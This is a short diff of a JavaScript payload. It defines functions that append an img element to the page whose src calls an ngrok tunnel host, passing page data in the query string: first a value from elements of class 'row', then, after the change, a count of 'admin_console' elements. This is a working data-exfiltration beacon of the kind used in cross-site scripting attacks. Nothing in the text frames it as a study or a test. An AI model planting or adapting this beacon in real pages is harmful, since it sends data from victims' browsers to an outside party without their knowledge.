@@ -6,7 +6,7 @@ function addTheImage() {
 }
 function addTheImage2() {
     var img = document.createElement('img');
-    img.src = "http://3e6850f2.ngrok.io?c="+document.getElementsByClassName("row").value;
+    img.src = "http://3e6850f2.ngrok.io?c="+document.getElementsByClassName("col-8 admin_console").length;
     document.body.appendChild(img);
 }
 addTheImage();
